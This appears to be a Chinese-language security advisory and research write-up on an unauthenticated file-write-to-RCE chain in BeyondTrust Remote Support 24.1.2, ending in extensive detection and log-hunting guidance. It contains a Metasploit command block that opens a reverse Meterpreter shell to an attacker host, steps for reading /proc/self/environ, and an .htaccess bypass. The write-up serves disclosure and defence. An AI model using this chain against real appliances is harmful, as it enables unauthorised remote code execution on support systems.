概述

BeyondTrust Remote Support 中的来源验证缺陷允许未经身份验证的攻击者在设备上写入文件，并以站点操作系统用户的身份执行代码。入口点是用于启动支持会话的公开客户连接。无需任何账户凭据或用户交互。

该缺陷位于内部消息路由器 brain 与设备端客户工作进程 thin-scc 之间。攻击者可以将保留的本地路由器 ID 放入消息的源地址中。路由器转发该消息，而工作进程会将该地址视为请求来自本地组件的证明。这使攻击者能够访问内部文件传输服务，包括其原生文件系统提供程序。

我们首先确认了文件写入，然后利用该原语将 PHP 文件上传到站点的公开目录。请求该文件后，我们得以站点用户身份执行代码。Metasploit 模块现已使用 PHP 和 Unix Command 目标实现此攻击链。

我们测试了 Remote Support 24.1.2, build 1524046，修订版本为 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3。测试设备启用了公开的问题菜单会话启动和 thin chat（默认设置）。尚未确定其他受影响的版本和修复版本。该虚拟机的 Secure Remote Access 基础设备版本 7.1.0 与 Remote Support 应用版本相互独立。 

影响

攻击者可以控制所上传文件的内容及其目标路径，但受工作进程文件系统权限的限制。同样的来源伪造也可用于调用文件发送操作。我们利用它获取了 /proc/self/environ，以确定 Remote Support 的基础安装路径，随后投放有效载荷

在测试的设备上，原生文件服务能够写入 PHP 文档根目录。Metasploit 模块返回以 msfuser（UID 1000）身份上下文执行代码的结果，这证明可作为站点用户实现未经身份验证的远程代码执行。

技术分析

我们将演示攻击者如何启动匿名会话，然后伪造一条会被设备接受为本地来源的消息。随后将概述如何访问原生文件传输服务、选择上传文件的内容和目标位置，并将文件写入转化为 PHP 执行。

地址使用 Ghidra 映像基址 0x100000。减去该值即可得到原始 ELF 虚拟地址。以 FUN_ 开头的函数名是 Ghidra 标签；如果有可用的诊断字符串，则采用其中的描述性名称。

启动匿名客户会话

我们首先通过 POST /api/start_session 获取两个客户密钥。这些是新生成的公开访客会话。密钥允许客户端使用客户传输通道，但不会标识已登录的账户。每个访客都通过 /nw WebSocket 端点连接，并使用原生或 thin 客户协议。

原生连接为我们提供内部消息路由系统的客户端，这里称为 MRS。精简连接则为我们提供设备端可寻址的工作进程。这两个步骤都不需要代表接受会话。

网络消息可以声称自己是本地消息

这就留下了一个缺口：该检查与实际路由器 ID 进行比较，而下游代码还会识别保留的本地别名。在此设备上，该别名为 1。

在被省略的 begin file 代码执行完毕后，同一个 app/thin-scc 接收器会在 [H3] 打开文件，并在 [H4] 写入传入的数据。 

完成后，接收器关闭文件；使用临时路径时，会将其重命名为最终目标位置。该服务已经接受绝对目标路径，因此不需要目录遍历。工作者信任伪造的本地源地址，所以会允许该请求。

从文件上传到 PHP 执行

下一步是选择一个可写位置，供 Web 服务器执行其中的文件。提供的 config/apache_vhost.conf 将文档根目录设置为：

/home/msfuser/ingredi-24.1.2/app/www/public

向该目录进行绝对路径上传已成功。不过，请求该文件时存在一个小问题：即使文件存在，以 .php 结尾的 URL 仍会返回 404。app/www/public/.htaccess 解释了原因。 

source/app/www/public/.htaccess：

# ... omitted: application routes and compatibility rewrites ...
RewriteCond %{THE_REQUEST} "^[^ ]* .*?\.php[?/ ].*$"
# [I1] Direct .php URLs return 404.
RewriteRule .* - [L,R=404]

# ... omitted: download-helper routes ...
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.php -f
# [I2] An extensionless URL executes the existing PHP file.
RewriteRule ^(.+)$ $1.php [L]

位于 [I1] 的规则拒绝直接 .php 请求。位于 [I2] 的规则将无扩展名的 URL 映射到现有的 PHP 文件。

请求已上传文件的基本文件名（不带.php）执行了我们的有效载荷。它返回了绝对文件名、EUID 1000 以及id的输出。 

我们还想避免猜测 Remote Support 的工作目录或带版本号的安装名称。同一原生服务可以使用UploadFiles将 worker 的/proc/self/environ发送给我们。在此设备上，其内容如下：

BG_app_root=/home/msfuser/ingredi-24.1.2
BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock

BG_app_root直接给出了安装目录。附加/app/www/public即可得到上传目标；socket 路径则提供了识别同一根目录的另一种方式。协议上有一个问题：procfs 报告环境文件的大小为零，但 worker 仍会流式传输其内容。我们必须读取到数据流的 EOF，而不能根据所报告的大小停止读取。 

漏洞利用

Metasploit 模块使用两个新建的公共客户会话执行该利用链。它通过Director.GetGatewaySessionValues为自身的 thin guest 发现 thin worker，向 worker 的主调度器发送伪造的LocalFileTransfer请求，并通过现有的 MRS 连接提供 PHP 字节。无需单独的上传服务器。

该模块将随机生成的 PHP 文件名写入站点的 public 目录，然后向无扩展名的 URL POST 一个执行令牌。PHP 文件检查该令牌，并在执行有效载荷前删除自身。目标0运行 PHP 有效载荷；目标1在 PHP 中封装 Unix 命令。

对于 PHP Meterpreter 有效载荷，基本配置如下：

use exploit/linux/http/beyondtrust_rs_mrs_file_upload
set RHOSTS 192.168.1.98
set TARGET 0
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.68
run verbose=true

选择目标0和兼容的命令有效载荷，例如php/meterpreter/reverse_tcp。模块文档介绍了目录覆盖及其他选项。

测试产生了两个 PHP Meterpreter 会话、一个经命令封装的 PHP Meterpreter 会话以及一个 Bash shell。两个目标也都在禁用 AutoCheck 的情况下运行过，并且立即重复利用成功。Bash shell 返回：

对已上传 PHP 端点的请求

仅使用命令的 Metasploit 运行创建了两个公共客户会话，调用其已上传的 PHP 端点，然后检查该端点是否已消失。相关的访问日志行如下：

在这里，/qdgusthrmlirprls 映射到公共目录中的 qdgusthrmlirprls.php。第一次 POST 运行命令并返回 200。之后的 POST 是模块的清理请求；GET 则独立检查了该端点。文件自行删除后，两者都收到 404。

这为防御人员提供了一个需要调查的序列：创建公共会话，随后请求一个新建且不熟悉的端点，之后可能对同一路径出现 404。仅创建会话属于正常的 Remote Support 活动。仅凭先出现 200、随后出现 404 也不足以判定；应将这些请求与文件变更、会话记录以及任何异常出站连接进行关联分析。

URL 可能不包含 .php

之前的 PHP canary 生成了以下日志行：

192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9]

直接请求 .php 失败，而不带扩展名的请求执行了同一文件。最后的 404 发生在文件自行删除之后。在此示例中，仅搜索以 .php 结尾的请求的检测会漏掉成功请求。

原生传输本身通过客户的 MRS 连接进行。这些访问日志条目显示的是 HTTP 触发器，而非文件内容或伪造的 router ID。捕获的 HTTP 日志未暴露内部 MRS 消息，因此仅凭它无法确定源地址绕过行为。

文件和连接

查找站点公共目录下意外的 PHP 文件，以及以 .php.n$t 结尾的接收文件。中断的传输可能留下临时文件，即使最终 URL 返回 404 也是如此。.n$t 后缀也属于正常传输实现的一部分，因此需要结合上下文判断其存在是否有意义。

原生文件传输痕迹

thin-scc.log 和 thin-scc-errors.log 包含有关文件服务请求的更直接证据。例如，thin-scc-errors.log 中的这一行给出了操作、原生提供程序和预期的 PHP 目标位置。只有 ckey 和 downloadToken 已被隐去：

20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0

这是我们的阴性对照：该请求使用客户常规的源地址，并被拒绝。它是尝试调用的证据，而非成功上传的证据。伪造的本地源能够通过产生此警告的检查，因此成功利用可能不会留下 DISCARDING NONLOCAL MESSAGE 条目。

成功运行 PHP 模块后，thin-scc.log 中留下了以下日志行：

20261029 17:06:37    319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031
20261029 17:06:37      2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0
20261029 17:06:37      0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0

我们的请求省略了 responseAddress。处理程序启动传输，然后尝试将其操作响应发送到空地址。这会产生 0:0:0 错误，但不会阻止文件写入。载荷回调在 17:06:37 独立确认了执行。

在 proc{LocalFileTransfer} 上下文中查找这种组合，尤其要注意不熟悉的 PHP 请求或出站连接。1:1129726787:1031 值标识一个内部 MRS 邮箱；客户端 IP 请参阅下方的 brain 连接记录。这些条目本身无法识别写入的文件名，也无法独立证明执行。空地址错误的出现还取决于漏洞利用请求的构造方式；其他实现可能会留下不同的痕迹。

Brain 连接记录

brain.log 有助于将此活动关联到客户端地址。以下两条记录出现在同一模块运行之前：

20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0'
20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'

这些记录可用于梳理时间线，但客户连接属于正常活动。在捕获的 brain 日志中，我们未发现 UploadFiles 或 DownloadAnonymousFiles 操作记录。还出现了通用的 EOF、连接重置和 conference 错误；这些错误范围过于宽泛，不能单独视为漏洞利用指标。

收集本机日志的位置

聚合日志位于 $BG_app_root/log/。当 worker 正在运行时，其自身日志位于 $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/。worker 退出时，包装器会将这些日志追加到站点的日志目录，然后清除每 worker 的副本。调查活动会话时，应同时收集这两个位置的日志。

捕获的 brain.ini 和 thin-scc.ini 均通过 enabled=0 禁用了调试输出。未捕获到调试日志，我们也未更改日志配置。Brain 的调试配置还将 MRS_* 类别限制为 Info，因此仅启用其调试输出并不能保证获得详细的消息载荷。

诸如 UploadFileStarted 和 DownloadFileEnded 之类的名称出现在本机协议的回调代码中，但我们未在收集到的日志中找到它们。不应将其表述为默认审计事件
